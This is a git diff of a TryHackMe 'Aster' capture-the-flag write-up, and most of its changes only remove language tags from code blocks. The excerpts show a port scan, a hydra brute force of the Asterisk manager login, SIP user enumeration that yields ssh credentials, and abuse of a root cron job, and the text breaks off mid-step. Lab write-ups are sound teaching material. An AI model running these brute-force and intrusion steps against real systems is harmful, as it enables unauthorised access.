@@ -14,7 +14,7 @@ Aster is a medium room available on [TryHackMe](https://tryhackme.com/room/aster
 
 Let’s start with a network scan to see which ports are open. I am using `rustscan` because of its easier syntax. 
 
-```bash
+```
 ┌──(giu㉿kali)-[~/Downloads/machine]
 └─$ rustscan -a $TARGET -- -A   
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -57,6 +57,7 @@ PORT     STATE SERVICE     REASON         VERSION
 1720/tcp open  h323q931?   syn-ack ttl 62
 2000/tcp open  cisco-sccp? syn-ack ttl 62
 5038/tcp open  asterisk    syn-ack ttl 62 Asterisk Call Manager 5.0.2
+...
 ```
 
 ## HTTP (80)
@@ -67,7 +68,7 @@ There is an open http port, so it makes sense to start the enumeration from ther
 
 After clicking on the download button, a `.pyc` file can be retrieved from server. Using `file` utility, we can see that it is a byte-compiled Python file.
 
-```python
+```
 ┌──(giu㉿kali)-[~/Downloads/machine]
 └─$ file output.pyc 
 output.pyc: python 2.7 byte-compiled
@@ -89,7 +90,7 @@ The message reveals that user `admin` exists on the “open source framework for
 
 The previous finding is confirmed by trying a basic connection to the 5038 port. Unlucky, there are no available exploits for the asterisk’s version running on the target server. 
 
-```bash
+```
 ┌──(giu㉿kali)-[~/Downloads/machine]
 └─$ nc $TARGET 5038
 Asterisk Call Manager/5.0.2
@@ -107,7 +108,7 @@ Because of the `admin` hint found in the previous message, it makes sense to try
 
 Using `rockyou.txt` as wordlist, we are able to get a pair of valid credentials. We can now login as user `admin`.
 
-```bash
+```
 ┌──(giu㉿kali)-[~/Downloads/machine]
 └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET asterisk
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -122,7 +123,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-16 11:36:
 
 For reference, I am using the following [online guide](https://asteriskrecipes.com/reference/cli-commands/cli-commands-quick-reference) for basic asterisks commands (make sure to press 2 times enter after each input 🙂).
 
-```bash
+```
 ┌──(giu㉿kali)-[~/Downloads/machine]
 └─$ nc $TARGET 5038
 Asterisk Call Manager/5.0.2
@@ -142,7 +143,7 @@ Status: Fully Booted
 
 Using `sip show users` command we are able to enumerate available users.
 
-```bash
+```
 action: command
 command: sip show users
 
@@ -160,7 +161,7 @@ The results show what seems a valid pair of credentials.
 
 Trying to login via ssh as user `harry` with the found password get us into the machine.
 
-```bash
+```
 ┌──(giu㉿kali)-[~/Downloads/machine]
 └─$ ssh harry@$TARGET
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
@@ -187,7 +188,7 @@ Now that the main user of the target server is compromised, we have to move on f
 
 `sudo -l`, `SUID`, and `crontab` file are the first things that I always look for.
 
-```bash
+```
 harry@ubuntu:~$ sudo -l
 [sudo] password for harry: 
 Sorry, user harry may not run sudo on ubuntu.
@@ -239,7 +240,7 @@ In this case, there is a suspicious crontab entry: `cd /root/java/ && bash run.s
 
 Remembering that in the user home directory there was a `.jar` file, i tried to extract it and see what’s inside.
 
-```bash
+```
 ┌──(giu㉿kali)-[~/Downloads/machine]
 └─$ scp harry@$TARGET:/home/harry/Example_Root.jar .  
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
@@ -265,7 +266,7 @@ Using again the same online decompiler, we are able to inspect the Java source c
 
 As we can see, the code checks if file `/tmp/flag.dat` exists, and then writes a secret message in `/home/harry/root.txt`. It is very likely, given the filename (`Example_Root.class`), that this code contains the logic of the `run.sh` script contained in the `crontab` file. Let’s try to create the `/tmp/flag.dat` file and see if the script writes the root flag inside `root.txt`.
 
-```bash
+```
 harry@ubuntu:~$ touch /tmp/flag.dat
 harry@ubuntu:~$ cat /tmp/flag.dat 
 harry@ubuntu:~$ ls
